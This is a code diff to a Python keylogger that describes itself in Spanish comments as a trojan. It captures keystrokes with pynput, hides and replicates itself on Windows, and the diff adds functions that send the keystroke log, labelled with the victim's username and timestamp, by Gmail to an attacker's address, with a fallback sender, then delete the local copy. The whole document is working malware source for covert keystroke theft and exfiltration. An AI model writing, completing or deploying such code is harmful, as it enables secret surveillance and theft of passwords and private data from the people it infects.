@@ -14,20 +14,20 @@
 
 #region import Libs
 from pynput.keyboard import Listener
-from getpass import getuser # Obtiene el nombre del usuario
-from datetime import datetime
-from winreg import *
-import datetime
-import random
-import os
+from getpass import getuser     # Obtiene el nombre del usuario
+from datetime import datetime   # Devuelve fecha y hora actual
+from winreg import *            # Modifica registros de Windows
+import datetime                 # Devuelve fecha y hora actual
+import random                   # Genera numeros
+import os                       # Lib para copiar archivos
 import telebot
-import yagmail
-import pymysql  # Lib connection mysql
-import shutil
-import string
+import yagmail                  # Enviar archivos solo a Gmail
+import pymysql                  # Lib connection mysql
+import shutil                   # Lib para crear carpetas
+import string                   # Lib genera textos
 import time
-import threading # Hilos
-import socket    # Librería verifica internet
+import threading                # Hilos
+import socket                   # Librería verifica internet
 #endregion
 
 
@@ -85,7 +85,7 @@ class Functions:
             return False    # La carpeta ya existe
         pass
 
-    def RandomChar(self,y=5):
+    def RandomChar(self,y=100):
         return ''.join(random.choice(string.ascii_letters) for x in range(y))
 
     # Función = Verifica si hay conexión a internet para poder envíar el log
@@ -99,6 +99,27 @@ class Functions:
         except:
             print("[Test Internet] => [NO]")
             return False
+    def SendGmail(self, file, email, password, receiver_email):
+        try:
+            f = datetime.datetime.now()
+            subject = "Data User: " + str(getuser())
+            # Inicia Sesión
+            yag = yagmail.SMTP(user=email, password=password)
+            informacion = "\nFecha: " + f.strftime("%A") + " " + f.strftime("%d") + " de " + f.strftime(
+                "%B") + "\nHora: " + f.strftime("%I") + ":" + f.strftime("%M") + " " + f.strftime(
+                "%p") + " con " + f.strftime("%S") + " Segundos"
+            # Cuerpo del mensaje
+            contents = [
+                "Información:\n\nNombre de Usuario: " + str(getuser()) + informacion
+            ]
+            yag.send(receiver_email, subject, contents, attachments=file)
+            print("[SendGmail] ["+email+"] Se envió el Registro de teclas correctamente")
+            return True
+        except:
+            print("[SendGmail] ["+email+"] No se pudo envíar el Registro de teclas")
+            return False
+
+
 
 class Util:
     def __init__(self): #Constructor?
@@ -140,7 +161,7 @@ class Util:
         self.CreateFolders()
         try:
             with open(Config().PATH_KEY, 'r') as f:  # Verifica si el keylogger se encuentra oculto en el sistema
-            print("[Trojan] - Ya se encuentra en el sistema : \n[" + Config().PATH_KEY+ "]")
+                print("[Trojan] - Ya se encuentra en el sistema : \n" + Config().PATH_KEY)
         except:
             print("[Trojan] - No se encuentra en el sistema...\nProceso Troyano...")
             try:
@@ -148,6 +169,25 @@ class Util:
                 print("\n[Trojan] - Se replico en el sistema correctamente")
             except:
                 print("\n[Trojan] - Hubo un problema al replicar en el sistema")
+
+    # Envía los datos reg.k vía Gmail
+    def SendGmail(self,log, sender_email, sender_password, receiver_email):
+        # Crea nombre del archivo
+        nameFile = str(getuser()) + "-" + Functions().RandomChar(12) + ".txt"
+        # Renombra el archivo original
+        self.RenameFileKey(nameFile) # Cambia el archivo `reg.k` a  `user - 234bkhj4b23k4g23vj43.txt`
+
+        # Envía el archivo renombrado
+        self.CreateFolders()
+        homedir = Config().LOG_KEY_PATH + str(nameFile)
+        print("[Gmail send] Proceso de envío...")
+
+
+        if SendGmail(homedir, emailP(), passP(), ReceiveE()):  # Envía con el primer correo
+            # Si se envíó correctamente, pues elimina el archivo
+            os.remove(homedir)
+        elif SendGmail(homedir, emailS(), passS(), ReceiveE()):  # Envía con el segundo correo
+            os.remove(homedir)
 
 
 
